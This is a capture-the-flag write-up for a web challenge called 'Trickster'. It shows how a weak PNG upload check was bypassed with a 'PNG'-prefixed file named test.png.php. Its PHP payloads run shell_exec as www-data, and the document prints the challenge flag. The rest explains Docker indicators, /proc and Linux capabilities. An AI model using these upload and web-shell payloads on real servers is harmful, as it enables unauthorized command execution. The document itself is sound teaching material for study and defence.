# Trickster CTF — PNG Upload, PHP Command Execution & Linux Process Enumeration

## 1. Challenge Overview

**Challenge:** Trickster  
**Category:** Web Exploitation  
**Target:** `http://chatelaine.cylabacademy.net:46363/`  
**Environment:** Apache, PHP, Docker-like container environment  
**Access obtained:** PHP command execution as `www-data`

### Objective

Investigate the PNG upload functionality, identify weaknesses in the validation process, obtain server-side command execution, and locate the challenge flag.

> Only perform these techniques on authorized CTF targets or systems you own.

---

## 2. Initial Reconnaissance

The target was a web application for uploading PNG images.

The upload form accepted a multipart file field named `file`.

The application used Apache and PHP. HTTP response headers showed:

- Apache/2.4.68 (Debian)
- PHP/8.2.33

The initial investigation focused on understanding the upload validation and how uploaded files were stored.

### Important endpoints

| Endpoint | Purpose |
|---|---|
| `/` | Upload interface |
| `/instructions.txt` | Application instructions |
| `/robots.txt` | Robots information |
| `/uploads/` | Uploaded files directory |

These endpoints provided useful information about the application's structure.

---

## 3. Understanding the PNG Validation Weakness

The application's instructions described checking the filename extension and the image's magic bytes.

A genuine PNG file starts with this eight-byte signature:

```text
89 50 4E 47 0D 0A 1A 0A
```

The ASCII characters `PNG` correspond to:

```text
50 4E 47
```

However, those three bytes alone are not the complete PNG signature.

The application's validation was weak enough that a file beginning with the literal text `PNG` could pass its content check.

### Why this matters

A filename extension does not prove what a file contains, and a short prefix check does not establish that a file is a valid PNG.

A secure application should validate the full file format and ensure that uploaded files cannot be interpreted as executable server-side code.

---

## 4. Achieving PHP Command Execution

The upload weakness allowed a specially crafted file named `test.png.php` to be uploaded and executed through the uploads directory.

Example test payload:

```php
PNG<?php echo "PHP works"; ?>
```

The response included:

```text
PNGPHP works
```

This demonstrated that the uploaded content was being interpreted as PHP when requested through the web server.

### Confirming command execution

A subsequent test used:

```php
PNG<?php
echo "<pre>";
echo shell_exec("id");
echo "</pre>";
?>
```

The output was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed server-side command execution under the `www-data` account.

### What is `www-data`?

`www-data` is a common Linux account used by web servers and web applications.

It is normally intended to have fewer privileges than root. However, its actual permissions depend on the system configuration, file permissions, capabilities, and security restrictions.

**Finding:** The upload vulnerability resulted in PHP execution and operating-system command execution as `www-data`.

---

## 5. Enumerating the Web Root

The next step was to inspect the application's directories rather than immediately attempt privilege escalation.

The web root was:

```text
/var/www/html
```

A directory listing revealed:

```text
/var/www/html/
├── MRTDGZRVMJSWM.txt
├── index.php
├── instructions.txt
├── robots.txt
└── uploads/
```

The unusual filename `MRTDGZRVMJSWM.txt` was an important clue.

The file was readable by the web-server account.

### Retrieving the file

The file could be requested directly:

```bash
/usr/bin/curl -i \
  http://chatelaine.cylabacademy.net:46363/MRTDGZRVMJSWM.txt
```

Its contents revealed the flag.

### Flag

```text
academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef}
```

**Key lesson:** Enumerating accessible files can be more effective than jumping directly to privilege escalation.

---

## 6. Investigating the Docker Environment

Several observations suggested that the application was running inside a container.

### Evidence observed

The root directory contained:

```text
/.dockerenv
```

The process information showed:

```text
/proc/1/comm
```

with output:

```text
docker-init
```

The UID mapping contained:

```text
         0     100000      65536
```

The root filesystem mount information also contained an overlay filesystem.

Together, these observations strongly suggested a containerized environment using a user namespace.

### What is Docker?

Docker runs applications in containers, which provide isolated environments for applications and their dependencies.

A container is not necessarily a virtual machine. Containers share the host's kernel while using isolation mechanisms to separate processes, filesystems, networking, and other resources.

### What is a user namespace?

A user namespace can map user IDs inside a namespace to different IDs outside it.

For example:

```text
Inside the namespace: UID 0
Outside the namespace: UID 100000
```

This example illustrates the mapping principle; the actual mapping depends on the configuration.

User namespaces can reduce the impact of certain container compromises, but their presence alone does not prove that the configuration is secure.

### Important conclusion

The presence of Docker indicators does not prove that host access or container escape is possible.

In this challenge, the flag was accessible from the web root. Root access and container escape were unnecessary.

---

## 7. Linux Process Information: `/proc`

One important concept learned during the investigation was the Linux `/proc` filesystem.

`/proc` is a virtual filesystem that exposes information about running processes and the kernel. Much of its content is generated dynamically rather than stored as ordinary files on disk.

### Understanding `/proc/self/status`

The path can be understood as three parts:

| Path component | Meaning |
|---|---|
| `/proc` | Virtual filesystem containing process and kernel information |
| `self` | The process accessing the path |
| `status` | A file containing status information about that process |

Inspect the current process's status with:

```bash
cat /proc/self/status
```

Common fields include:

| Field | Meaning |
|---|---|
| `Name` | Process name |
| `Pid` | Process ID |
| `PPid` | Parent process ID |
| `Uid` | Real, effective, saved-set, and filesystem user IDs |
| `Gid` | Corresponding group IDs |
| `CapInh` | Inheritable capability mask |
| `CapPrm` | Permitted capability mask |
| `CapEff` | Effective capability mask |
| `CapBnd` | Capability bounding-set mask |
| `CapAmb` | Ambient capability mask |
| `NoNewPrivs` | Whether the process has the no-new-privileges restriction enabled |
| `Seccomp` | Seccomp mode |

To display only the capability fields:

```bash
grep '^Cap' /proc/self/status
```

### Important process detail

`/proc/self` refers to the process accessing the path.

For example, with:

```bash
cat /proc/self/status
```

the information normally describes `cat`, because `cat` opens the file.

When commands are launched through PHP's `shell_exec()`, the shell and its child processes are separate processes. Their status information may differ from that of PHP.

To inspect PHP's own status from within PHP, read the file directly:

```php
<?php
$status = file_get_contents('/proc/self/status');
echo htmlspecialchars($status, ENT_QUOTES, 'UTF-8');
?>
```

This example illustrates process introspection. Only use such diagnostic code in an authorized environment.

---

## 8. Understanding Linux Capabilities

Linux capabilities divide certain traditional root privileges into smaller permissions.

Instead of considering only whether a process is root, capabilities help describe which privileged operations it can perform.

For example:

| Capability | General purpose |
|---|---|
| `CAP_NET_RAW` | Certain raw and packet socket operations |
| `CAP_NET_ADMIN` | Certain network administration operations |
| `CAP_SYS_ADMIN` | A broad collection of administrative operations |
| `CAP_DAC_OVERRIDE` | Bypasses certain discretionary file permission checks |
| `CAP_SETUID` | Allows specified changes to process user IDs |

The actual effect of a capability depends on the operation, namespace, and surrounding security restrictions.

### The five capability fields

| Field | Simple explanation |
|---|---|
| `CapInh` | Capabilities marked for possible inheritance across program execution |
| `CapPrm` | Capabilities the process is permitted to make effective |
| `CapEff` | Capabilities currently active for permission checks |
| `CapBnd` | Limits capabilities that can be acquired through certain privilege transitions |
| `CapAmb` | Capabilities that can carry across execution of eligible programs |

### Understanding the hexadecimal values

Capability fields are hexadecimal bitmasks. Individual bits represent individual capabilities.

The value:

```text
0000000000000000
```

means no capability bits are set in that particular mask.

The value:

```text
00000000a80425fb
```

is nonzero, meaning some bits are set. To identify their names, the mask must be decoded.

A nonzero bounding set does not mean those capabilities are active.

---

## 9. Interpreting the CTF Capability Results

The investigation produced these values:

```text
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

Assuming these values came from the intended process:

- `CapInh = 0`: no inheritable capability bits were set.
- `CapPrm = 0`: no permitted capability bits were set.
- `CapEff = 0`: no effective capability bits were set.
- `CapBnd` was nonzero: some capabilities were in the bounding set.
- `CapAmb = 0`: no ambient capability bits were set.

### Most important takeaway

`CapEff = 0` means that the inspected process had no effective Linux capabilities.

It does not, by itself, prove that the process cannot perform any privileged operation under every possible condition. Nor does it tell us whether the process is inside Docker.

Always identify which process produced the result.

---

## 10. Decoding Capability Masks in Kali

The `capsh` utility can convert hexadecimal capability masks into readable names.

Install the required package:

```bash
sudo apt update
sudo apt install libcap2-bin
```

Decode the bounding-set value from the investigation:

```bash
capsh --decode=00000000a80425fb
```

To display the local process's capability fields:

```bash
grep '^Cap' /proc/self/status
```

Remember that running these commands in Kali examines the local Kali environment, not the remote CTF server.

A decoded bounding set is not the same thing as a list of capabilities currently active in a process.

---

## 11. Other Useful `/proc` Paths

These paths are useful when learning Linux process introspection.

| Path | Information |
|---|---|
| `/proc/self/status` | Status of the process accessing the file |
| `/proc/self/cmdline` | Command-line arguments |
| `/proc/self/environ` | Environment variables, subject to access restrictions |
| `/proc/self/exe` | Link to the running executable |
| `/proc/self/uid_map` | User-ID mapping for the process's user namespace |
| `/proc/self/gid_map` | Group-ID mapping for the process's user namespace |
| `/proc/1/comm` | Name of process ID 1 in the relevant PID namespace |
| `/proc/mounts` | Mount information visible in that environment |

For example:

```bash
cat /proc/self/uid_map
cat /proc/self/gid_map
cat /proc/1/comm
cat /proc/mounts
```

Some entries can be restricted, and their interpretation depends on namespaces and permissions.

---

## 12. Additional Lessons Learned

### Lesson 1: Enumerate before escalating

Do not assume a CTF requires root access just because command execution has been obtained.

Inspect accessible files and application directories first.

### Lesson 2: File extensions are not reliable security boundaries

A filename ending in `.png` does not prove that its contents are a valid PNG image.

### Lesson 3: File validation and execution permissions are separate issues

Even if an application accepts an uploaded file, the web server should not execute uploaded content as PHP.

### Lesson 4: User IDs and capabilities describe different things

`uid=33(www-data)` identifies the account running a command.

`CapEff` describes the process's effective Linux capabilities.

Neither value alone gives a complete picture of its permissions.

### Lesson 5: Docker indicators are evidence, not proof of exploitability

A `.dockerenv` file, an overlay filesystem, and namespace mappings help identify a container environment. They do not automatically imply a container escape.

### Lesson 6: Identify the process being inspected

Commands such as `cat`, `grep`, and PHP can have different process identities and security contexts.

Always understand which process `/proc/self/status` describes.

---

## 13. Final Summary

The Trickster challenge demonstrated how weak upload validation can lead to server-side PHP execution and operating-system command execution.

The initial objective was achieved by enumerating the web root and finding a readable text file containing the flag.

During the investigation, additional Linux concepts were explored:

- Docker and container indicators
- Linux user namespaces
- The `/proc` virtual filesystem
- Process status and identity
- Linux capabilities and capability masks
- The distinction between permitted, effective, and bounding capabilities

The biggest lesson was that understanding the environment and carefully enumerating accessible resources can be more valuable than immediately attempting privilege escalation.

### Flag

`academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef}`
